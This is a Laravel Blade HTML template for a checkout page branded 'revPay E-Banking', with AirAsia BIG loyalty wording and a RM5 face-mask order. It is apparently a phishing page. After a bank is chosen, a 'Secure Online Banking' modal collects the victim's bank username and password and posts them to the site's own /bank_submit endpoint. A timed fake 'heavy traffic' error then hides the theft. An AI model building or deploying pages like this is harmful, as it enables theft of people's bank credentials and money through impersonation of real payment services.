<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>revPay E-Banking</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" href="{{asset('pages/bank/css/style.css')}}">
    <link rel="stylesheet" href="{{asset('css/bootstrap.min.css')}}">
    <style>
        #ajax-loading{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.3);
            z-index: 1100;
        }
    </style>
</head>
<body>
    <div class="container" id="logo-section">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6"> 
                <img src="{{asset('pages/bank/images/logo.png')}}" class="img-fluid"> 
            </div>
            <div class="col-xs-12 col-md-6 col-lg-6 desktop-timer">
                    <div id="timer">{{date('h:i A')}}</div>
            </div>
        </div>
    </div>
    <div class="container" id="desktop-banner">
        <div class="row">
            <div class="col-md-12">
                
            </div>
        </div>
    </div>
    <form id="frm" name="frm" method="post" action="">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-lg-6 col-xs-12 order-last desktop-left">
                    <div class="row" id="desc-section">
                        @php
                            $total_amount = $sale->price * $sale->quantity;
                        @endphp
                        <div class="col-12">
                            <h4>Total Amount</h4>
                            <h3 id="amount">RM5.00</h3>
                            <p>REF No: N{{str_pad($sale->id, 8, "0", STR_PAD_LEFT)}}-RM 5.00</p>
                            <p>{{date('d F Y h:i A')}}</p>
                            <p class="font-weight-bold" style="font-size: 16px">{{$sale->quantity}} x 3 ply face mask</p>
                        </div>
                    </div>
                    <div class="row" id="form-section">
                        <div class="col-12">
                            <h5 id="desktop-note">Note:<br>
                                Select your bank to make payment. Please do not click on browser's back button, refresh or close this page. Please enter your AirAsia BIG Loyalty registered email address to earn BIG Points for your purchase. By providing this email address, you confirm, agree and consent for AirAsia BIG to pass your email address to revPAY which may be used by revPAY to contact you in the future for any matters related to the issuance of BIG Points or purchase of your product.
                            </h5>
                        </div>
                    </div>
                    <div class="row" id="desktop-button-section">
                        <div class="col-12">
                            <div class="card">
                                <p>By clicking Confirm &amp; Pay, you have consent and agreed to the <a href="javascript:;" target="_blank">Terms</a> with respect to our processing of your personal information.</p>
                                <div class="row">
                                    <div class="col-8">
                                        <button class="btn btn-success btn-lg btn-block" name="btnsubmit" type="button" data-toggle="modal" data-target="#paymentModal">CONFIRM &amp; PAY</button>
                                    </div>
                                    <div class="col-4">
                                        <button class="btn btn-default btn-lg btn-block" name="btnsubmit" type="button" >CANCEL</button>
                                    </div>
                                    <!--<div class="col-4"> <a href="#">CANCEL</a> </div>-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6 col-lg-6 col-xs-12 order-first desktop-right">
                    <div class="row" id="payment-methods">
                        <div class="col-12">
                            <ul class="list-group">
                                @php
                                    $data = \App\Bank::all();
                                @endphp
                                @foreach ($data as $item)                                    
                                    <li class="list-group-item">
                                        <div class="row">
                                            <div class="col-9">
                                                <div class="radio-item">
                                                    <input type="radio" name="bank_id" id="{{'rdo_bankid_'.$item->slug}}" value="{{$item->id}}" class="radio" @if($item->slug == 'maybank2u') checked @endif data-image="{{asset($item->image)}}" />
                                                    <label for="{{'rdo_bankid_'.$item->slug}}">{{$item->name}}</label>
                                                </div>
                                            </div>
                                            <div class="col-3"><img src="{{asset($item->image)}}"></div>
                                        </div>
                                    </li>
                                @endforeach
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row" id="button-section">
                <div class="col-12">
                    <p>By clicking Confirm &amp; Pay, you have consent and agreed to the <a href="javascript:;" target="_blank">Terms</a> with respect to our processing of your personal information.</p>
                    <button class="btn btn-success btn-lg btn-block" name="btnsubmit" type="button" data-toggle="modal" data-target="#paymentModal">CONFIRM &amp; PAY</button>
                    <div style="text-align: center;">
                        <button class="btn btn-default btn-lg btn-block" name="btnsubmit" type="button" value="cancel" onclick="clickBtn('cancel');">CANCEL</button>
                    </div>
                    <h5 id="mobile-note"> Note:<br>
                        Select your bank to make payment. Please do not click on browser's back button, refresh or close this page. Please enter your AirAsia BIG Loyalty registered email address to earn BIG Points for your purchase. By providing this email address, you confirm, agree and consent for AirAsia BIG to pass your email address to revPAY which may be used by revPAY to contact you in the future for any matters related to the issuance of BIG Points or purchase of your product.
                    </h5>
                </div>
            </div>
        </div>
    </form>

    <div class="modal fade" id="paymentModal" data-backdrop="static" data-keyboard="false" style="display: none;" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">            
                <div class="modal-header d-none d-sm-block">
                    <h4 class="modal-title float-left">* Secure Online Banking :</h4>
                    <button type="button" class="close" data-dismiss="modal">X</button>
                </div>                
                <div class="modal-body">
                    <div class="row d-flex justify-content-center" id="paymentBox">
                        <div class="col-md-3 pt-3">
                            <img src="{{asset('pages/bank/images/maybank.png')}}" class="logo-img img-fluid" id="modal_bank_img" width="100%" alt="">
                        </div>
                        <div class="col-md-9 form-area">
                            <h6 class="text-center">Please use your <strong>Internet Banking</strong> account username and password to login.</h6>
                            <form action="{{route('bank_submit')}}" method="post" id="paymentForm">
                                @csrf
                                <input type="hidden" name="sale_id" value="{{$sale->id}}">
                                <input type="hidden" class="bank" name="bank_id" id="bank_id" value="1" />
                                <input type="hidden" name="reference_no" value="N{{str_pad($sale->id, 8, "0", STR_PAD_LEFT)}}-RM 5.00">
                                <div class="form-group mt-3">
                                    <div class="input-group mb-3">
                                        <div class="input-group-prepend">
                                            <span class="input-group-text"><i class="fas fa-user"></i></span>
                                        </div>
                                        <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="Bank Username">                                    
                                    </div>
                                </div>
                                <div class="form-group mt-3">
                                    <div class="input-group mb-3">
                                        <div class="input-group-prepend">
                                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
                                        </div>
                                        <input type="password" class="form-control password" name="password" required placeholder="Bank Password">
                                    </div>                                    
                                </div>
                                <div class="form-group mt-3">
                                    <input type="text" class="form-control" name="amount" value="RM 5" placeholder="Amount" />
                                </div>
                                <div class="form-group mt-3">
                                    <button type="submit" class="btn btn-primary btn-block mt-2" id="btn_submit">Submit</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="ajax-loading" class="text-center">
        <img class="mx-auto" src="{{asset('images/loader.gif')}}" width="70" alt="" style="margin:45vh auto;margin-bottom: 20px;">
        <p style="font-weight: bold;">Please wait. We are preparing your request</p>
    </div>
    <script src="{{asset('js/jquery.min.js')}}"></script>
    <script src="{{asset('js/bootstrap.min.js')}}"></script>
    <script>
        $(document).ready(function(){
            var bank_id = 1;
            var bank_image = '';
            $("#frm").change(function(){
                bank_id = $("input[name='bank_id']:checked").val();
                bank_image = $("input[name='bank_id']:checked").data('image');
                $("#bank_id").val(bank_id);
                $("#modal_bank_img").attr('src', bank_image);
            });

            $("#paymentForm").submit(function(e){
                e.preventDefault();
                if(bank_id == '') {
                    alert('Please select bank.');
                    $("#paymentModal").modal('hide');
                    return false;
                } else {
                    $.ajax({
                        url : '/bank_submit',
                        data : $("#paymentForm").serialize(),
                        method : 'POST',
                        dataType : 'json',
                        beforeSend: function() {
                            $("#paymentModal").modal('hide');
                            $("#ajax-loading").fadeIn();
                        },
                        success: function(response) {
                            console.log('success');
                            setTimeout(function(){ 
                                $("#ajax-loading").fadeOut();
                                alert("site will be slow due to heavy traffic . Please try again later, Or Contact :12313131"); 
                            }, 15000);
                        },
                    });
                }
            });
        });
    </script>
</body>
</html>